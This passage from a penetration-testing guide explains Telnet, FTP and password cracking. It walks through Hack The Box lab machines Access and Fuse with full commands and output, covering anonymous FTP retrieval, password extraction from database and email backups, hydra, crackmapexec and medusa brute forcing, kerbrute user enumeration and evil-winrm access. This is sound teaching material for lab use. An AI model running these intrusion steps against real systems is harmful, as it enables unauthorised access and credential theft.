  -<>-127.0.0.1:1080-<><>-127.0.0.1:5901-<><>-OK
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
```

Which launches a VNC session as root

![VNC session as root on Poison](../.gitbook/assets/poison2.png)



VNC's encryption of passwords is more obfuscation than encryption as the key that is used for the DES encryption is well known. It is trivial to find an application that will decrypt the password in the file "secret" and it turns out to be "VNCP@$$!".

## Telnet and FTP

### Telnet

Telnet is an old protocol that provides a command-line interface via remote access. The telnet server usually listens on TCP port 23. Because it was never designed with security in mind, it is less used for administration purposes on computers but is still used on network devices and Internet of Things devices. A large number of IoT devices have shipped with default passwords set for Telnet access allowing attackers to access and take over the devices to enlist them in "botnets". Botnets are a collection of devices all running similar software/malware that can be coordinated in an attack like a Distributed Denial of Service \(DdoS\).

What commands are supported by the telnet server depends on the platform. On windows for example, it will be the cmd.exe commands that are supported. On a Cisco network switch, you will be presented with the Cisco CLI \(Command Line Interface\). In this regard, it is similar to SSH in running a specific shell after a successful login.

### FTP

File Transfer Protocol allows a client to upload and download files using a set of simple commands. The FTP server normally has 2 TCP ports that it uses, port 21 for FTP commands and port 20 for sending and receiving data. FTP operates in two different modes active and passive. In active mode, the FTP client connects to the command port of the server on port 21. The client starts listening for data on a port that is the next port from the one it opened to connect to the server. The FTP server connects to this port on the client from its local data port and sends or receives data when requested by the client.

The trouble with active mode is that clients are often behind firewalls or on a private network that does not allow for inbound connections on dynamic ports. For this reason, FTP also supports a passive mode. In passive mode, the server opens a random port for data connections and passes this to the client to connect to. Of course, having the FTP server open to a range of open ports to support passive mode creates security vulnerabilities of its own.

#### Exercise: Enumerating and exploiting FTP and Telnet on Hack The Box case machine Access

Access is a Windows box that has an FTP server on which you will find a backup of an MS Access database and a password-protected ZIP file containing a backup of a Microsoft Outlook email file. Dumping the Access database give server usernames and passwords, one of which can be used to unzip the ZIP file. Viewing the emails in the PST file found there, gives another password that can be used to gain access via Telnet.

An nmap scan shows that the TCP ports 21 \(FTP\), 23 \(Telnet\) and 80 \(HTTP\) are open. Nmap tells you that anonymous login is allowed on FTP.

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Access]
└──╼ $sudo nmap -v -sC -sV -T4 --min-rate 1000 -p- access.htb -oA nmap/full-tcp
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_ SYST: Windows_NT
23/tcp open telnet?
80/tcp open http Microsoft IIS httpd 7.5
| http-methods:
| Supported Methods: OPTIONS TRACE GET HEAD POST
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

On logging in with user anonymous, password anonymous, you find 2 directories, "Backups" and "Engineer". The Backups directory contains an mdb file which indicates that it is a backup of an Access database file. The Engineer directory contains a zip file named "Access Control.zip".

To download everything to our machine, we can use wget from our local machine:

```bash
┌─[rin@parrot]─[~/boxes/Access/FTP]
└──╼ $wget -r --no-passive-ftp ftp://anonymous:anonymous@access.htb
--2021-02-28 14:58:13-- ftp://anonymous:*password*@access.htb/
=> ‘access.htb/.listing’
Resolving access.htb (access.htb)... 10.129.105.84
Connecting to access.htb (access.htb)|10.129.105.84|:21... connected.
Logging in as anonymous ... Logged in!
<SNIP>
```

The -r flag tells wget to do a recursive fetch which goes into every directory and fetches the contents. The --no-passive-ftp flag tells wget not to try and download files using passive mode. If you try and run the command without the --no-passive-ftp flag, wget will try and establish passive mode and fail, aborting the command.

Once the command completes, you will have the following on your local disk:

┌─\[rin@parrot\]─\[~/boxes/Access/FTP\]

└──╼ $tree access.htb

access.htb

├── Backups

│ └── backup.mdb

└── Engineer

└── Access Control.zip

2 directories, 2 files

If you try and unzip Access Control.zip, it will give an error saying that it can't unzip because the zip file uses "unsupported compression method 99" which means that it was zipped using 7-Zip. If you try 7z on it, you will be prompted for a password. So leaving that for the moment, you can explore the access database backup using mdbtools which can be installed with:

┌─\[rin@parrot\]─\[~\]

└──╼ $sudo apt install mdbtools

Create a directory called tables and move backup.mdb into it then run:

for I in $\(mdb-tables backup.mdb\);do mdb-export backup.mdb $i &gt; $i;done

This script will get each table name and then export the contents of the table, saving it to a file named using the table name. Most of the tables are empty and you can sort the files by line count using:

wc -l \* \| sort -n

On looking at the files with more than 2 lines, you will notice a table called auth\_user:

┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Access/tables\]

└──╼ $cat auth\_user

id,username,password,Status,last\_login,RoleID,Remark

25,"admin","admin",1,"08/23/18 21:11:47",26,

27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,

28,"backup\_admin","admin",1,"08/23/18 21:14:02",26,

The first thing to try is the engineer password on the zip file:

┌─\[rin@parrot\]─\[~/boxes/Access/access.htb/Engineer\]

└──╼ $7z x 'Access Control.zip'

7-Zip \[64\] 16.02 : Copyright I 1999-2016 Igor Pavlov : 2016-05-21

p7zip Version 16.02 \(locale=en\_AU.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs IntelI CoreI i9-9980HK CPU @ 2.40GHz \(906ED\),ASM,AES-NI\)

Scanning the drive for archives:

1 file, 10870 bytes \(11 KiB\)

Extracting archive: Access Control.zip

--

Path = Access Control.zip

Type = zip

Physical Size = 10870

Enter password \(will not be echoed\):

Everything is Ok

Size: 271360

Compressed: 10870

The pst file is a Microsoft Outlook email file that can be read using the program "readpst". Running this on "Access Control.pst" will extract an mbox file. With cat, the contents reveal an email that is in the "Deleted Items" folder. This email is from john@megacorp.com to security@accesscontrolsystems.com saying that:

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller. Please ensure this is passed on to your engineers.

You can then use the username security and password 4Cc3ssC0ntr0ller to telnet onto the box:

┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Access\]

└──╼ $telnet access.htb

Trying 10.129.45.60...

Connected to access.htb.

Escape character is '^\]'.

Welcome to Microsoft Telnet Service

login: security

password:

\*===============================================================

Microsoft Telnet Server.

\*===============================================================

C:\Users\security&gt;whoami

access\security

C:\Users\security&gt;

It won't be long before you notice that the shell that Telnet provides is limited. The arrow keys don't work and nor does the delete key. Output is not formatted correctly. This is a very good example of where the shell is not a full TTY. You can improve things by running a Nishang PowerShell reverse shell, but I will leave this here for the moment and come back later when I discuss privilege escalation and persistence.

Brute forcing remote service passwords

We have already come across some examples of brute forcing passwords \(and usernames\) but we are going to go into the subject a bit more deeply here and look one tool in particular THC Hydra to brute force a variety of remote services. First, it is worth mentioning some background about passwords. The perceived wisdom about passwords has changed with the main recommendation for passwords being length and not complexity \(NIST SP 800-63B \([https://pages.nist.gov/800-63-3/sp800-63b.html\)\](https://pages.nist.gov/800-63-3/sp800-63b.html%29\)\). The determination was that adding rules about specific characters and complexity only added a burden on users to remember the password and led to behaviors where users used patterns to choose their passwords. The advent of highly efficient offline password hashing and checking computers along with millions of available breached passwords has led to the increased possibility of a password being brute forced.

Password hashing depends on the use of a mathematical function that is called a one-way function. It is easy to calculate the hash of a piece of plain text but almost impossible to generate the text from the hash. Hashes are also of fixed length, so no matter how long the piece of text being hashed, the hash itself is always the same length. In the case of the SHA-512 hashing algorithm commonly used on modern Linux-based systems, the output is 64 bytes long. If the only thing that was done with a password was to take the plain text and hash it, it would not be very secure. This is because it would be possible to use tables of pre-computed hashes, called rainbow tables\) for millions of common passwords and compare them to the hash to get a match. That process would be very fast. Even without the rainbow tables, doing a brute force on a dictionary of words by hashing each word and comparing it with the hash we want to crack would also be very fast, especially on modern computers with Graphical Processing Units \(GPUs\).

To prevent these types of attacks, password hashing uses a salt, a piece of random text that is up to 16 characters long \(for the SHA-512 hashing algorithm\) and adds that to the password and hashes that. However, it doesn't just do this one, it does it a minimum of 1,000 times taking the product of each round and adding it back in a variety of ways. The aim of this process is to make the calculation of hashes computationally expensive i.e. to slow it down.

Of course, not all password hashes are generated in this way and despite the improvements in hashing algorithms, it is still possible to brute force passwords if they are short and are a common dictionary word.

There are two main ways of brute forcing a password: online and offline. We have encountered methods for both already but let's start with offline cracking. Obtaining password hashes is only the beginning of the process of being able to crack them. We first have to identify what type of hash we are dealing with. The password cracking software hashcat has a flag that will show example hashes for all of the different hashing modes. To list all of the modes of hashing that hashcat supports, you can use the --help flag

┌─\[rin@parrot\]─\[~/book\]

└──╼ $hashcat --help

…

* \[ Hash modes \] -

  \# \| Name \| Category

  ======+=====================+======================================

  900 \| MD4 \| Raw Hash

  0 \| MD5 \| Raw Hash

  100 \| SHA1 \| Raw Hash

  1300 \| SHA2-224 \| Raw Hash

  1400 \| SHA2-256 \| Raw Hash

  10800 \| SHA2-384 \| Raw Hash

  1700 \| SHA2-512 \| Raw Hash

  17300 \| SHA3-224 \| Raw Hash

  17400 \| SHA3-256 \| Raw Hash

  17500 \| SHA3-384 \| Raw Hash

  17600 \| SHA3-512 \| Raw Hash

  6000 \| RIPEMD-160 \| Raw Hash

  600 \| BLAKE2b-512 \| Raw Hash

…

For each of these modes, we can show an example of the hash by using --example-hashes

┌─\[rin@parrot\]─\[~/boxes\]

└──╼ $hashcat -m 1800 --example-hashes

hashcat \(v6.1.1\) starting...

MODE: 1800

TYPE: sha512crypt $6$, SHA512 \(Unix\)

HASH: $6$72820166$U4DVzpcYxgw7MVVDGGvB2/H5lRistD5.Ah4upwENR5UtffLR4X4SxSzfREv8z6wVl0jRFX40/KnYVvK4829kD1

PASS: hashcat

Password cracking can operate in a number of different ways. The first and most basic is to simply try every character combination in sequence. At the opposite end of the scale is to use dictionaries of common passwords and/or common character combinations. As variants of these two approaches, we can optimize the dictionaries by applying what we know about the password syntax rules and also information we may have gathered about the target, personal details like hobbies and interests, dates of birth, where they work etc.

In terms of password syntax, we may know what the minimum and maximum numbers of characters are, whether there needs to be a capital letter, special characters and numbers. Armed with this knowledge, we can simply parse dictionaries like rockyou.txt with a tool like grep. For example, if we wanted to get words that are between 8 and 9 characters long, we could use:

egrep '^.{8,9}$' passwords.txt

egrep is an alias for grep -E which supports extended regular expressions. Regular expressions are a set of patterns that will match text according to certain rules. In this expression, the ^ matches the start of a string. The . matches any character and the {8,9} will match characters 8 or 9 times. Finally, the $ matches the end of the word. We can make this expression exclude words that have uppercase letters in them:

egrep '^\[^\[:upper:\]\]{6,7}$' passwords.txt

The expression \[\[:upper:\]\] matches uppercase letters and the ^ within the \[\] means 'not'.

The approach of taking a password list and refining it certainly makes the process of cracking faster, provided the password you are looking for is in the list. However, even though a person may use a common password, they will often change it by altering numbers at the end, either a sequence or referring to a specific date for example. A fan of the French soccer team may have the password France2018 representing one of the years that France won the FIFA World Cup.

The tool CUPP \(Common User Passwords Profiler\) \([https://github.com/Mebus/cupp\](https://github.com/Mebus/cupp\)\) will ask a series of questions about a target to create a set of possible password combinations. Of course this relies on having access to personal information about the target such as their family members' names, dates of birth, pet names, work and hobbies.

Another approach is to crawl a company website for potential words that could be used as a password using a tool like CeWL \(Custom Word List Generator [https://digi.ninja/projects/cewl.php\](https://digi.ninja/projects/cewl.php\)\). Again, this isn't sophisticated, it just takes words that it finds and creates a password list.

Once you have a wordlist, you can use tools to take the words and create different combinations to create a more extensive list of passwords. One of these is Mentalist \(git clone [https://github.com/sc0tfree/mentalist.git\](https://github.com/sc0tfree/mentalist.git\)\) which allows you to take a wordlist and then apply a chain of transformations that will do things like change case, substitute numbers for letters and other substitutions \(e.g. zero instead of the letter O, 3 instead of e, 5 instead of s\) and to take things like zip or postal codes and other words and prepend or postpend them to the word. You can either use this to generate a new dictionary to use for cracking, or create a set of rules that can be directly used by John The Ripper or Hashcat.

We will go through an example of generating a custom word list in a moment, but first we can turn to tools for testing passwords directly with an application online. This has become much more challenging recently with improvements in applications that will lock users out after a small number of failed login attempts. However, it can still work where these protections have not been applied, websites with poor security practices, services that do not have the means for password protections of this sort and devices like the Internet of Things where again, password protection is not implemented by default.

Online Password Brute Force

We have already seen a number of tools that can be used to test usernames and passwords for specific remote services. The most comprehensive of these is THC Hydra \([https://github.com/vanhauser-thc/thc-hydra\](https://github.com/vanhauser-thc/thc-hydra\)\) which supports more than 50 different protocols. The basic syntax of Hydra is illustrated in the examples printed out with the use of hydra -h

hydra -l user -P passlist.txt ftp://192.168.0.1

hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN

hydra -C defaults.txt -6 pop3s://\[2001:db8::1\]:143/TLS:DIGEST-MD5

hydra -l admin -p password ftp://\[192.168.0.0/24\]/

hydra -L logins.txt -P pws.txt -M targets.txt ssh

The -l and -p flags expect a username and password respectively. The capital versions -L and -P will accept files of usernames and passwords. The service is of the format:

&lt;protocol&gt;://&lt;IP Address&gt;:&lt;Port&gt;/&lt;Protocol Options&gt;

&lt;protocol&gt; will be the type of service such as http, smb, ftp pop3. The port can be specified in addition to the IP address although the default port will be used if this is omitted. Finally, there is the ability to specify particular authentication variants as part of the protocol specification.

Medusa is another tool, like hydra, which will allow the brute forcing of a range of different services but it has been largely unmaintained since 2015.

Metasploit also has a number of scanners for services such as FTP, SMB and SSH that will do brute force logins as well. There are also other tools such as Crackmapexec which supports a few protocols such as SMB, HTTP and MSSQL \(Microsoft SQL Server\).

As we will see however, all of these tools respond differently to different settings and protocols and so it is possible to get both false positives and negatives. Checking with another tool is always a good idea.

Exercise: Brute forcing usernames and passwords for remote access on Hack The Box machine Fuse

In this exercise, we enumerate users and potential passwords from the public website of the machine Fuse. We then use a few tools, including Kerbrute and CrackMapExec. Eventually we get a username and password that allows us to gain remote access to the machine using evil-winrm.

An nmap scan of the box gives us the following ports:

┌─\[rin@parrot\]─\[~/boxes/Fuse\]

└──╼ $nmap -v -sC -sV -T4 --min-rate 1000 -p- fuse.htb -oA nmap/full-tcp

&lt;SNIP&gt;

PORT STATE SERVICE VERSION

53/tcp open domain Simple DNS Plus

80/tcp open http Microsoft IIS httpd 10.0

\| http-methods:

\| Supported Methods: OPTIONS TRACE GET HEAD POST

\|\_ Potentially risky methods: TRACE

\|\_http-server-header: Microsoft-IIS/10.0

\|\_http-title: Site doesn't have a title \(text/html\).

88/tcp open kerberos-sec Microsoft Windows Kerberos \(server time: 2020-12-21 03:44:56Z\)

135/tcp open msrpc Microsoft Windows RPC

139/tcp open netbios-ssn Microsoft Windows netbios-ssn

389/tcp open ldap Microsoft Windows Active Directory LDAP \(Domain: fabricorp.local, Site: Default-First-Site-Name\)

445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds \(workgroup: FABRICORP\)

464/tcp open kpasswd5?

593/tcp open ncacn\_http Microsoft Windows RPC over HTTP 1.0

636/tcp open tcpwrapped

3268/tcp open ldap Microsoft Windows Active Directory LDAP \(Domain: fabricorp.local, Site: Default-First-Site-Name\)

3269/tcp open tcpwrapped

5985/tcp open http Microsoft HTTPAPI httpd 2.0 \(SSDP/UPnP\)

\|\_http-server-header: Microsoft-HTTPAPI/2.0

\|\_http-title: Not Found

9389/tcp open mc-nmf .NET Message Framing

49666/tcp open msrpc Microsoft Windows RPC

49667/tcp open msrpc Microsoft Windows RPC

49675/tcp open ncacn\_http Microsoft Windows RPC over HTTP 1.0

49676/tcp open msrpc Microsoft Windows RPC

49679/tcp open msrpc Microsoft Windows RPC

49697/tcp open msrpc Microsoft Windows RPC

49755/tcp open msrpc Microsoft Windows RPC

Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

\|\_clock-skew: mean: 2h55m31s, deviation: 4h37m09s, median: 15m29s

\| smb-os-discovery:

\| OS: Windows Server 2016 Standard 14393 \(Windows Server 2016 Standard 6.3\)

\| Computer name: Fuse

\| NetBIOS computer name: FUSE\x00

\| Domain name: fabricorp.local

\| Forest name: fabricorp.local

\| FQDN: Fuse.fabricorp.local

\|\_ System time: 2020-12-20T19:45:52-08:00

\| smb-security-mode:

\| account\_used: &lt;blank&gt;

\| authentication\_level: user

\| challenge\_response: supported

\|\_ message\_signing: required

\| smb2-security-mode:

\| 2.02:

\|\_ Message signing enabled and required

\| smb2-time:

\| date: 2020-12-21T03:45:51

\|\_ start\_date: 2020-12-21T03:35:26

The OS discovery suggests that the box is a Windows Server 2016. The variety of ports like DNS, LDAP and Kerberos suggest that it is an Active Directory domain controller with the domain fabricorp.local. We can add this hostname to the /etc/hosts file. An interesting note at this point is whether add the fabricorp.local DNS to the list of nameservers to query so that any other subdomains would be accessible automatically. You can normally do this by adding the entry nameserver &lt;IP address&gt; to the file /etc/resolv.conf. However, in this case, the DNS returned the incorrect IP address for fabricorp.local and so this is not an option.

Going to the website, we get redirected to the URL [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm) and so we can add fuse.fabricorp.local to the /etc/hosts file as well. This gives us a page shown in Figure 4-8.

!\[Graphical user interface

Description automatically generated\]\(../.gitbook/assets/6.png\)

fuse.fabricorp.local home page. A PaperCut printing administration page.

The page is an instance of the PaperCut printing software printer logs. On the page, we can see print logs for 3 specific days. Going into each entry, we find records of print jobs for a variety of users as in the entry for the 29th May 2020 shown in Figure 4-9.

![](../.gitbook/assets/7.png)

Print log for 29th May 2020.

Enumerating the website it is apparent that the site is static HTML and so even if there was a CVE related to this version of PaperCut, there would be nothing to exploit. Instead, we can focus on the users that are listed with the print jobs:

pmerton

tlavel

sthompson

bhult

administrator

We can add these to a file users.txt and use a program kerbrute to check if these users exist on the fabricorp.local domain. To get kerbrute, you can download a release from [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute). Running this with the users listed above, we get:

┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]

└──╼ $kerbrute userenum -d fabricorp.local --dc fabricorp.local users.txt

\_\_ \_\_ \_\_

/ /\_\_\_\_\_ \_\_\_\_\_/ /\_ \_\_\_\_\_\_\_ \_\_/ /\_\_\_\_

/ //\_/ \_ \/ \_\_\_/ \_\_ \/ \_\_\_/ / / / \_\_/ \_ \

/ ,&lt; / \_\_/ / / /\_/ / / / /\_/ / /\_/ \_\_/

/\_/\|\_\|\_\_\_/\_/ /\_.\_\_\_/\_/ \_\_,\_/\_\_/\_\_\_/

Version: v1.0.3 \(9dad6e1\) - 12/21/20 - Ronnie Flathers @ropnop

2020/12/21 13:58:13 &gt; Using KDC\(s\):

2020/12/21 13:58:13 &gt; fabricorp.local:88

2020/12/21 13:58:14 &gt; \[+\] VALID USERNAME: pmerton@fabricorp.local

2020/12/21 13:58:14 &gt; \[+\] VALID USERNAME: tlavel@fabricorp.local

2020/12/21 13:58:14 &gt; \[+\] VALID USERNAME: sthompson@fabricorp.local

2020/12/21 13:58:14 &gt; \[+\] VALID USERNAME: administrator@fabricorp.local

2020/12/21 13:58:14 &gt; \[+\] VALID USERNAME: bhult@fabricorp.local

2020/12/21 13:58:14 &gt; Done! Tested 5 usernames \(5 valid\) in 0.389 seconds

Now that we have valid usernames, we need password candidates and a place to try them. We are going to use CeWL to parse the website and generate a wordlist.

┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]

└──╼ $cewl -d 3 -m 8 --with-numbers -w fabricorp\_wordlist.txt [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm)

CeWL 5.4.8 \(Inclusion\) Robin Wood \(robin@digi.ninja\) \([https://digi.ninja/\](https://digi.ninja/\)\)

We have specified a depth of 3 \(-d 3\) for the program to crawl, a minimum password length of 8 \(-m 8\), we want words that contain numbers \(--with-numbers\) and an output file fabricorp\_wordlist.txt and the URL of the home page we want to crawl. This generates a wordlist of the type:

┌─\[rin@parrot\]─\[~/boxes/Fuse\]

└──╼ $cat fabricorp\_wordlist.txt

PaperCut

GRAYSCALE

papercut

sthompson

LONWK019

Document

Grayscale

Software

Copyright

Location

NotepadLETTER

Language

printing

International

bnielson

LONWK015

mountain

Fabricorp01

We can't use Hydra with this machine. It will error out when trying to brute force SMB and if you try SMB v2, after compiling a version with this support, it will not report the specific SMB error we are looking for. To do that, we need to use crackmapexec which illustrates that sometimes using a range of tools is a good option. Using crackmapexec, we get an error for the user tlavel and password Fabricorp01 that the STATUS\_PASSWORD\_MUST\_CHANGE.

┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]

└──╼ $crackmapexec smb fuse.htb -u users.txt -p fabricorp\_wordlist.txt

SMB 10.129.2.5 445 FUSE \[\*\] Windows Server 2016 Standard 14393 x64 \(name:FUSE\) \(domain:fabricorp.local\) \(signing:True\) \(SM

Bv1:True\)

SMB 10.129.2.5 445 FUSE \[-\] fabricorp.local\pmerton:PaperCut STATUS\_LOGON\_FAILURE

SMB 10.129.2.5 445 FUSE \[-\] fabricorp.local\tlavel:LONWK015 STATUS\_LOGON\_FAILURE

SMB 10.129.2.5 445 FUSE \[-\] fabricorp.local\tlavel:mountain STATUS\_LOGON\_FAILURE

SMB 10.129.2.5 445 FUSE \[-\] fabricorp.local\tlavel:Fabricorp01 STATUS\_PASSWORD\_MUST\_CHANGE

An alternative to crackmapexec is medusa which can be used with the the user file \(-U users.txt\), the password file \(-P fabricorp\_wordlist.txt\) and the SMB NT module \(-M smbnt\). This gives the following output:

┌─\[rin@parrot\]─\[~/boxes/Fuse\]

└──╼ $medusa -h fuse.htb -U users.txt -P fabricorp\_wordlist.txt -M smbnt

Medusa v2.2 \[[http://www.foofus.net\](http://www.foofus.net\)\] \(C\) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;

ACCOUNT CHECK: \[smbnt\] Host: fuse.htb \(1 of 1, 0 complete\) User: pmerton \(1 of 5, 0 complete\) Password: PaperCut \(1 of 45 complete\)

ACCOUNT CHECK: \[smbnt\] Host: fuse.htb \(1 of 1, 0 complete\) User: pmerton \(1 of 5, 0 complete\) Password: GRAYSCALE \(2 of 45 complete\)

ACCOUNT CHECK: \[smbnt\] Host: fuse.htb \(1 of 1, 0 complete\) User: pmerton \(1 of 5, 0 complete\) Password: papercut \(3 of 45 complete\)

ACCOUNT CHECK: \[smbnt\] Host: fuse.htb \(1 of 1, 0 complete\) User: pmerton \(1 of 5, 0 complete\) Password: sthompson \(4 of 45 complete\)

…

ACCOUNT CHECK: \[smbnt\] Host: fuse.htb \(1 of 1, 0 complete\) User: tlavel \(2 of 5, 1 complete\) Password: Fabricorp01 \(18 of 45 complete\)

ACCOUNT FOUND: \[smbnt\] Host: fuse.htb User: tlavel Password: Fabricorp01 \[SUCCESS \(0x000224:STATUS\_PASSWORD\_MUST\_CHANGE\)\]

…

Whichever way you do it, the end result is that the password for tlavel, Fabricorp01 needs to be reset. We can do this with smbpasswd:

┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]

└──╼ $smbpasswd -U tlavel -r fabricorp.local

Old SMB password:

New SMB password:

Retype new SMB password:

Password changed for user tlavel

If we test the new password Fabricorp02 with crackmapexec, we get:

┌─\[rin@parrot\]─\[/opt/impacket\]

└──╼ $crackmapexec smb fuse.htb -u tlavel -p Fabricorp02

SMB 10.129.70.212 445 FUSE \[\*\] Windows Server 2016 Standard 14393 x64 \(name:FUSE\) \(domain:fabricorp.local\) \(signing:True\) \(SMBv1:True\)

SMB 10.129.70.212 445 FUSE \[+\] fabricorp.local\tlavel:Fabricorp02

The password gets reset every minute on this machine back to Fabricorp01 and so whatever we do to test access, we need to do it straight after resetting the password. There is also a password history kept and so each time the password is changed from Fabricorp01, it needs to be changed to an entirely new password.

We can do that and then log into the machine using rpcclient. Interestingly, rpcclient will also report NT\_STATUS\_PASSWORD\_MUST\_CHANGE if we use the original Fabricorp01

┌─\[rin@parrot\]─\[~/boxes/Fuse\]

└──╼ $rpcclient -U tlavel fuse.htb

Enter WORKGROUP\tlavel's password:

Cannot connect to server. Error was NT\_STATUS\_PASSWORD\_MUST\_CHANGE

Using enumdomusers to enumerate the users on the box, we get an extended list of users:

┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]

└──╼ $rpcclient -U tlavel fuse.htb

Enter WORKGROUP\tlavel's password:

rpcclient $&gt; enumdomusers

user:\[Administrator\] rid:\[0x1f4\]

user:\[Guest\] rid:\[0x1f5\]

user:\[krbtgt\] rid:\[0x1f6\]

user:\[DefaultAccount\] rid:\[0x1f7\]

user:\[svc-print\] rid:\[0x450\]

user:\[bnielson\] rid:\[0x451\]

user:\[sthompson\] rid:\[0x641\]

user:\[tlavel\] rid:\[0x642\]

user:\[pmerton\] rid:\[0x643\]

user:\[svc-scan\] rid:\[0x645\]

user:\[bhult\] rid:\[0x1bbd\]

user:\[dandrews\] rid:\[0x1bbe\]

user:\[mberbatov\] rid:\[0x1db1\]

user:\[astein\] rid:\[0x1db2\]

user:\[dmuir\] rid:\[0x1db3\]

rpcclient $&gt;

We can collect all of the users and create a new users file with these users in it called rpc\_users.txt and then just extract the usernames with the command:

cat rpc\_users.txt \| awk -F '\\[\|\]' '{print $2}' &gt; rpc\_users2.txt

The awk command uses the -F flag to specify the field separator regular expression. We are separating the text between the square bracket \(\[\]\) characters. The '\' is necessary to escape the first \[. If we try and write to the same file, it will end up blank and so that is why we need to create a separate file.

Back on rpcclient, we can look at printers that might be shared by using the enumprinters command. This gives output which contains a password:

rpcclient $&gt; enumprinters

flags:\[0x800000\]

name:\[\10.129.70.212\HP-MFT01\]

description:\[\10.129.70.212\HP-MFT01,HP Universal Printing PCL 6,Central \(Near IT, scan2docs password: $fab@s3Rv1ce$1\)\]

comment:\[\]

rpcclient $&gt;

A password has been saved in the description $fab@s3Rv1ce$1 which we can test with the users we enumerated earlier:

┌─\[oztechmuse@parrot\]─\[~/boxes/Fuse\]

└──╼ $crackmapexec smb fuse.htb -u rpc\_users.txt -p '$fab@s3Rv1ce$1'

SMB 10.129.70.212 445 FUSE \[\*\] Windows Server 2016 Standard 14393 x64 \(name:FUSE\) \(domain:fabricorp.local\) \(signing:True\) \(SMBv1:True\)

SMB 10.129.70.212 445 FUSE \[-\] fabricorp.local\Administrator:$fab@s3Rv1ce$1 STATUS\_LOGON\_FAILURE

SMB 10.129.70.212 445 FUSE \[+\] fabricorp.local\svc-print:$fab@s3Rv1ce$1

We get a hit with the username svc-print which we can then use to get access with evil-wrinrm:

┌─\[rin@parrot\]─\[~/boxes/Fuse\]

└──╼ $evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i fuse.htb

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

\*Evil-WinRM\* PS C:\Users\svc-print\Documents&gt;

The user flag is in c:\Users\svc-print\Desktop\users.txt.

We will leave this here and come back to Fuse in a subsequent chapter where we cover further enumeration for discovery and privilege escalation. Next however we are going to explore custom exploitation as a means of gaining initial access.

1. 
